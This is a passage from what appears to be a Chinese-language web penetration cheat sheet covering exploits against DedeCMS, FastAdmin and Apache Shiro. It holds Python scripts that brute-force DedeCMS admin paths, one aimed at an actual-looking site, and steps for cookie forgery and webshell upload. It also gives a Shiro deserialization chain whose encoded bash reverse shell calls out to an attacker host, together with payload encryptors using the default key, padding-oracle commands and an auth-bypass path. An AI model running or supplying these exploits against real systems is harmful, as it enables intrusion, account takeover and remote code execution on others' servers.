keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>characters <span class=\"token operator\">=</span> <span class=\"token string\">\"abcdefghijklmnopqrstuvwxyz0123456789_!#\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>back_dir <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://www.test.com/tags.php\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"./&#123;p&#125;&lt;&lt;/images/adminico.gif\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string\">\"_FILES[mochazz][name]\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string\">\"_FILES[mochazz][size]\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token string\">\"_FILES[mochazz][type]\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string\">\"image/gif\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> num <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">if</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">for</span> pre <span class=\"token keyword\">in</span> itertools<span class=\"token punctuation\">.</span>permutations<span class=\"token punctuation\">(</span>characters<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        pre <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>pre<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">=</span>pre<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"testing\"</span><span class=\"token punctuation\">,</span>pre<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"Upload filetype not allow !\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text <span class=\"token keyword\">and</span> r<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            flag <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            back_dir <span class=\"token operator\">=</span> pre</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"./&#123;p&#125;&lt;&lt;/images/adminico.gif\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"./&#123;p&#125;&lt;&lt;/images/adminico.gif\"</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] 前缀为：\"</span><span class=\"token punctuation\">,</span>back_dir<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">if</span> flag<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">for</span> ch <span class=\"token keyword\">in</span> characters<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> ch <span class=\"token operator\">==</span> characters<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            flag <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">=</span>back_dir<span class=\"token operator\">+</span>ch<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"Upload filetype not allow !\"</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text <span class=\"token keyword\">and</span> r<span class=\"token punctuation\">.</span>status_code <span class=\"token operator\">==</span> <span class=\"token number\">200</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            back_dir <span class=\"token operator\">+=</span> ch</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] \"</span><span class=\"token punctuation\">,</span>back_dir<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"./&#123;p&#125;&lt;&lt;/images/adminico.gif\"</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>            data<span class=\"token punctuation\">[</span><span class=\"token string\">\"_FILES[mochazz][tmp_name]\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"./&#123;p&#125;&lt;&lt;/images/adminico.gif\"</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"后台地址为：\"</span><span class=\"token punctuation\">,</span>back_dir<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>rss.php\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payloads <span class=\"token operator\">=</span> <span class=\"token string\">'abcdefghijklmnopqrstuvwxyz0123456789_-'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>menu <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> k <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> payload <span class=\"token keyword\">in</span> payloads<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token string\">\"dopost=save&amp;_FILES[b4dboy][tmp_name]=../%s%s&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif\"</span><span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>menu<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://www.yx-tv.com/plus/rss.php\"</span><span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">\"Content-Type\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"application/x-www-form-urlencoded\"</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span> res<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"utf-8\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span><span class=\"token string\">\"Error\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            menu <span class=\"token operator\">+=</span> payload</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> payload <span class=\"token operator\">==</span> <span class=\"token string\">'-'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>menu<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>menu<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"dedecms前台重置任意管理员密码\"><a class=\"anchor\" href=\"#dedecms前台重置任意管理员密码\">#</a> dedecms 前台重置任意管理员密码</h3>\n<pre><code>https://xz.aliyun.com/t/1959\n</code></pre>\n<h3 id=\"伪造cookie登录任意前台用户\"><a class=\"anchor\" href=\"#伪造cookie登录任意前台用户\">#</a> 伪造 cookie 登录任意前台用户</h3>\n<pre><code>注册用户user1\n访问\n/member/index.php?uid=user1\n登录user1\n将last_vid的值赋给DedeUserID，last_vidckMd5的值赋给DedeUserIDckMd5修改后的cookie\n</code></pre>\n<h3 id=\"前台上传shell\"><a class=\"anchor\" href=\"#前台上传shell\">#</a> 前台上传 shell</h3>\n<pre><code>Admin登录，发表文章，修改文件名1.jpg.p*hp\n后台文件上传\n访问/dede/tpl.php?action=upload\nF12获取token\n访问\n/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=[token值]\n/dede/tpl.php?filename=moonsec.lib.php&amp;action=savetagfile&amp;content=&lt;?php phpinfo();?&gt;&amp;token=6d0c1893e01a77e7e6ba24fb2dc7599c\nShell位置/include/taglib/moonsec.lib.php\n</code></pre>\n<h3 id=\"后台getshell\"><a class=\"anchor\" href=\"#后台getshell\">#</a> 后台 getshell</h3>\n<pre><code>模块-&gt;广告管理-&gt;新建广告，在广告内容中添加一句话\n/plus/ad_js.php?aid=[x]\n</code></pre>\n<h2 id=\"fastadmin前台getshell\"><a class=\"anchor\" href=\"#fastadmin前台getshell\">#</a> FastAdmin 前台 getshell</h2>\n<pre><code>前台创建用户，修改头像，传图片马\n/public/index/user/_empty?name=../../public/uploads/20200926/4a91d432904c0042bcd038ea96ad4947.jpg\n</code></pre>\n<h2 id=\"shiro-rememberme反序列化漏洞\"><a class=\"anchor\" href=\"#shiro-rememberme反序列化漏洞\">#</a> Shiro rememberMe 反序列化漏洞</h2>\n<pre><code>Shiro相关转自bypass公众号\nhttps://github.com/insightglacier/Shiro_exploit\npython shiro_exploit.py -u http://192.168.172.129:8080\n</code></pre>\n<p><img data-src=\"828.png\" alt=\"\" /></p>\n<pre><code>通过获取到的key，常见的漏洞利用方式有两种：反弹shell和写入文件。\n反弹shell\n监听本地端口\nnc -lvp 1234\nJava Runtime 配合 bash 编码，在线编码地址：\nhttp://www.jackson-t.ca/runtime-exec-payloads.html\n将bash -i &gt;&amp; /dev/tcp/192.168.172.133/1234 0&gt;&amp;1编码\nbash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\n通过ysoserial中JRMP监听模块，监听6666端口并执行反弹shell命令\njava -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 6666 CommonsCollections4 'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3Mi4xMzMvMTIzNCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'\n使用shiro.py 生成Payload\npython shiro.py 192.168.172.133:6666\n</code></pre>\n<p><img data-src=\"829.png\" alt=\"\" /></p>\n<pre><code>shiro.py代码如下\n</code></pre>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Cipher <span class=\"token keyword\">import</span> AES</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encode_rememberme</span><span class=\"token punctuation\">(</span>command<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>popen <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>Popen<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'java'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-jar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'ysoserial-0.0.6-SNAPSHOT-all.jar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'JRMPClient'</span><span class=\"token punctuation\">,</span> command<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> stdout<span class=\"token operator\">=</span>subprocess<span class=\"token punctuation\">.</span>PIPE<span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>BS <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>block_size    </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> s<span class=\"token punctuation\">:</span> s <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>BS <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> BS<span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>BS <span class=\"token operator\">-</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> BS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>key <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span><span class=\"token string\">\"kPH+bIxk5D2deZiIxcaaaA==\"</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>iv <span class=\"token operator\">=</span> uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">bytes</span>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>encryptor <span class=\"token operator\">=</span> AES<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> AES<span class=\"token punctuation\">.</span>MODE_CBC<span class=\"token punctuation\">,</span> iv<span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre>file_body <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>popen<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>base64_ciphertext <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>iv <span class=\"token operator\">+</span> encryptor<span class=\"token punctuation\">.</span>encrypt<span class=\"token punctuation\">(</span>file_body<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">return</span> base64_ciphertext</pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>   payload <span class=\"token operator\">=</span> encode_rememberme<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>   <span class=\"token keyword\">print</span> <span class=\"token string\">\"rememberMe=&#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><pre><code>构造数据包，伪造cookie，发送Payload。\n</code></pre>\n<p><img data-src=\"830.png\" alt=\"\" /><br />\n<img data-src=\"831.png\" alt=\"\" /></p>\n<pre><code>写入文件\n生成poc.ser文件\nsudo java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/success&quot; &gt; poc.ser\n使用Shiro内置的默认密钥对Payload进行加密：\n</code></pre>\n<p><img data-src=\"832.png\" alt=\"\" /></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">shiro</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>shiro<span class=\"token punctuation\">.</span>crypto<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">AesCipherService</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>shiro<span class=\"token punctuation\">.</span>codec<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">CodecSupport</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>shiro<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ByteSource</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>shiro<span class=\"token punctuation\">.</span>codec<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Base64</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">org<span class=\"token punctuation\">.</span>apache<span class=\"token punctuation\">.</span>shiro<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DefaultSerializer</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>nio<span class=\"token punctuation\">.</span>file<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileSystems</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>nio<span class=\"token punctuation\">.</span>file<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Files</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token namespace\">java<span class=\"token punctuation\">.</span>nio<span class=\"token punctuation\">.</span>file<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Paths</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TestRemember</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> payloads <span class=\"token operator\">=</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">readAllBytes</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">FileSystems</span><span class=\"token punctuation\">.</span><span class=\"token function\">getDefault</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getPath</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"d://poc.ser\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        \t<span class=\"token class-name\">AesCipherService</span> aes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">AesCipherService</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> key <span class=\"token operator\">=</span> <span class=\"token class-name\">Base64</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">CodecSupport</span><span class=\"token punctuation\">.</span><span class=\"token function\">toBytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"kPH+bIxk5D2deZiIxcaaaA==\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">ByteSource</span> ciphertext <span class=\"token operator\">=</span> aes<span class=\"token punctuation\">.</span><span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>payloads<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span>ciphertext<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><img data-src=\"833.png\" alt=\"\" /><br />\n<img data-src=\"834.png\" alt=\"\" /></p>\n<h2 id=\"shiro-padding-oracle-attack\"><a class=\"anchor\" href=\"#shiro-padding-oracle-attack\">#</a> Shiro Padding Oracle Attack</h2>\n<pre><code>登录Shiro网站，从cookie中获得rememberMe字段的值\n</code></pre>\n<p><img data-src=\"835.png\" alt=\"\" /></p>\n<pre><code>利用DNSlog探测，通过ysoserial工具payload。\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping 75bbot.dnslog.cn&quot; &gt; payload.class\n使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击。\njava -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath\nhttps://github.com/longofo/PaddingOracleAttack-Shiro-721\n</code></pre>\n<p><img data-src=\"836.png\" alt=\"\" /><br />\n<img data-src=\"837.png\" alt=\"\" /></p>\n<pre><code>使用构造的rememberMe攻击字符串重新请求网站\n</code></pre>\n<p><img data-src=\"838.png\" alt=\"\" /><br />\n<img data-src=\"839.png\" alt=\"\" /></p>\n<pre><code>一键自动化漏洞利用工具\nhttps://github.com/feihong-cs/ShiroExploit\n</code></pre>\n<h2 id=\"shiro权限绕过\"><a class=\"anchor\" href=\"#shiro权限绕过\">#</a> shiro 权限绕过</h2>\n<pre><code>/;/test/admin/page\n</code></pre>\n<h2 id=\"编辑器漏洞\"><a class=\"anchor\" href=\"#编辑器漏洞\">#</a> 编辑器漏洞</h2>\n<h3 id=\"fckeditor\"><a class=\"anchor\" href=\"#fckeditor\">#</a> 